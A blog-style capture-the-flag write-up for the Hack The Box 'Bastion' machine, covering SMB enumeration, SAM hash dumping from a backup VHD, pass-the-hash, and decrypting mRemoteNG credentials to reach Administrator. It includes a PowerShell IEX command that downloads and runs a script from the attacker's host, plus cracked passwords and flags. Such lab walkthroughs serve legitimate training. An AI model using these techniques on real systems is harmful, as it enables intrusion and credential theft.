---
title : "2020-02-HTB-Bastion"
author: Jesse Moore
date: 2020-02-07 09:26:00 +0800
categories: [HTB]
tags: [Windows]
---
![Screenshot 2022-05-18 202633](https://user-images.githubusercontent.com/6413570/169198097-7183d13b-8e54-4aa9-adb7-84f9131e7638.jpg)

10.10.10.134

ippsec.rocks/?#locat

https://www.hackthebox.eu/home/machines/profile/186
https://overflow.uaacyber.dev/2019/09/bastion.html
https://0xrick.github.io/hack-the-box/bastion/
https://github.com/kmahyyg/mremoteng-decrypt
https://www.elasticice.net/?p=255


![image](https://user-images.githubusercontent.com/6413570/169198090-dbe50757-25a2-4566-9967-56b7c8ef46b1.png)

nmap -sV -sC -oA nmap/Bastion 10.10.10.134

![image](https://user-images.githubusercontent.com/6413570/169198195-03df5cfb-eefc-49d6-8208-81a563e6eac8.png)

Scan the host as anonymous for open smb shares using SMBMap. 
Install SMBMap
![image](https://user-images.githubusercontent.com/6413570/169198253-6f4e02d1-320d-47e3-b3b0-7c01f7a904f3.png)

python3 -m pip install -r requirements.txt

List Shares that have no password:
smbclient --list //bastion.htb/ -U '
![image](https://user-images.githubusercontent.com/6413570/169198311-2555d8f0-69fa-4006-8a47-f6c6139e314d.png)


Looks like Backups is the only Comment that doesn't say we cant access

smbclient //10.10.10.134/Backups -U 

![image](https://user-images.githubusercontent.com/6413570/169198373-b6015259-46cb-4241-864b-64244065d0e9.png)

press l to list

![image](https://user-images.githubusercontent.com/6413570/169198429-82bf0367-631f-4726-b618-bc899f5df383.png)

![image](https://user-images.githubusercontent.com/6413570/169198460-b3df6a92-9861-429a-aa96-a5d9c00f6f25.png)

So we need to mount the VHD in the other directory
![image](https://user-images.githubusercontent.com/6413570/169198507-6f0c298f-dcad-426b-82ba-78f0c680819b.png)

cd Backup
![image](https://user-images.githubusercontent.com/6413570/169198529-c862e7cc-7f36-4d5e-9646-fba621978462.png)

See the VHD

Mount Backups
mount -t cifs //10.10.10.134/Backups /mnt/smb
![image](https://user-images.githubusercontent.com/6413570/169198566-ca3de773-3d2f-4a31-88d0-110e4c3d0ce2.png)

cat note.txt
![image](https://user-images.githubusercontent.com/6413570/169198605-712b7487-793a-494f-838f-7e9ead661e87.png)

use &zip if you want to see files... however we will just mount the vhd using guestmount
7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd

####################################
mkdir /mnt/vhd2
guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd2

to mount a VHD you need this:
apt install libguestfs-tools

Create a mount directory to use for the mount
mkdir /mnt/vhd2

Use guestmount to mount the VHD
guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd2
![image](https://user-images.githubusercontent.com/6413570/169198657-2ec6290a-68be-4831-aa27-70acd39f3c78.png)

Find files in these directories
find Desktop Documents/ Downloads/ -ls
![image](https://user-images.githubusercontent.com/6413570/169198699-5d565314-ee5e-49df-b337-8b9110697e44.png)

Go into vhd2 and navigate to config in Windows to obtain SAM and SYSTEM files
![image](https://user-images.githubusercontent.com/6413570/169198737-a18b9713-591a-4a7e-bcb8-5808ab1db5ee.png)

cp SAM SYSTEM /root/htb/bastion
cd /root/htb/bastion
mkdir backup-dump
mv SAM SYSTEM backup-dump/
cd backup-dump/
![image](https://user-images.githubusercontent.com/6413570/169198770-6957f2c0-90bd-4dd7-ae54-0f676ed15f10.png)

root@kali:~/htb/bastion/backup-dump# impacket-secretsdump -sam SAM -system SYSTEM local

![image](https://user-images.githubusercontent.com/6413570/169198813-2e9837fa-f727-4ce5-9ee5-b6286624260b.png)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::


NOTICE the Administrator NT HASH is BLANK aka 31d6c and the LM hash of aad3, which means the Administrative account is disabled.

try to crack the L4mpje hash 26112010952d963c8dc4217daec986d9 

https://crackstation.net/
![image](https://user-images.githubusercontent.com/6413570/169198862-1bea1925-8c17-4920-9355-8133d76faf05.png)


bureaulampje

OR pass the hash
smbmap -u L4mpje -p ad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 -H 10.10.10.134

ssh L4mpje@10.10.10.134
bureaulampje

![image](https://user-images.githubusercontent.com/6413570/169198890-39ffc99e-ddef-4213-9285-d815d93f33fa.png)

net localgroup administrators
net user l4mpje
net user administrator

now that you see administrator has logged in... time to Priv Esc

Grab from Kali
JAWS Enumeration powershell github

git clone https://github.com/411Hall/JAWS.git


On TARGET:
powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/jaws-enum.ps1')
![image](https://user-images.githubusercontent.com/6413570/169198945-4c0f91a7-f49a-4fe6-b665-e568c6048e83.png)


In ANOTHER Windows
root@kali:~/htb/bastion# echo l4mpje:bureaulampje > creds
root@kali:~/htb/bastion# ls
backup-dump creds JAWS mountstuf nmap smbmap
root@kali:~/htb/bastion# cat creds
l4mpje:bureaulampje
root@kali:~/htb/bastion# ssh l4mpje@10.10.10.134
![image](https://user-images.githubusercontent.com/6413570/169198982-396b2d03-a845-4870-b9d0-ae2f5e14b3cc.png)

type C:\Users\L4mpje\Desktop\user.txt 

PS C:\Users\L4mpje> type C:\Users\L4mpje\Desktop\user.txt 
9bfe57d5c3309db3a151772f9d86c6cd 

git clone https://github.com/411Hall/JAWS.git

![image](https://user-images.githubusercontent.com/6413570/169199638-6e3a68b8-493d-427c-88a3-c8dc4e79d2c5.png)

python -m SimpleHTTPServer


On the TARGET:
powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/jaws-enum.ps1')


Looking through the JAWS output we see a programx86 as mRemoteNG

![image](https://user-images.githubusercontent.com/6413570/169199027-94265486-0687-408d-aa88-507f0d5c1892.png)

After manually enumerating installed programs mRemoteNG stands out of interest. Tool is used to remotely access server resources and is suggested to store credentials in an insecure manner. Credentials for application noted as being stored in file confCons.xml. Copy of the confCons.xml file obtained from %USER%/AppData/Roaming/mremoteng/confCons.xmland reviewed. 

Two items of interest found from reviewing file are below. File appears to store RDP credentialsfor user Administrator and L4mpje.
![image](https://user-images.githubusercontent.com/6413570/169199067-dae94686-b0b0-42c2-9247-b4c3df41a0ba.png)

Download decrypt python tool
https://github.com/kmahyyg/mremoteng-decrypt

Download the mRemotNG confCons.xml from target
scp l4mpje@10.10.10.134:/Users/L4mpje/AppData/Roaming/mRemoteNG/confCons.xml .
![image](https://user-images.githubusercontent.com/6413570/169199111-b7d8cb29-b75e-4e5a-a50a-5a67b2eddd3e.png)


cat confCons.xml | grep Password
![image](https://user-images.githubusercontent.com/6413570/169199149-8e3e94ae-46ff-40bc-b38d-ea69e93d0c69.png)

Username=Administrator Domain= Password=aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw== Hostname=127.0.0.1 Protocol=RDP
![image](https://user-images.githubusercontent.com/6413570/169199194-431f5a5a-641c-4d05-9d82-ac4d704e2476.png)

root@kali:~/htb/bastion/mremoteng-decrypt# python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2

Now SSH with that password as Administrator
ssh administrator@10.10.10.134


administrator@BASTION C:\Users\Administrator\Desktop>type root.txt 
958850b91811676ed6620a9c430e65c8
![image](https://user-images.githubusercontent.com/6413570/169199226-f131b09f-a0a0-4e49-9a17-cc31144146f8.png)


If you find the notes interesting, you can buy me a coffee 

<a href="https://www.buymeacoffee.com/jessefmoore"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a Coffee?&emoji=&slug=jessefmoore&button_colour=b86e19&font_colour=ffffff&font_family=Poppins&outline_colour=ffffff&coffee_colour=FFDD00" /></a>

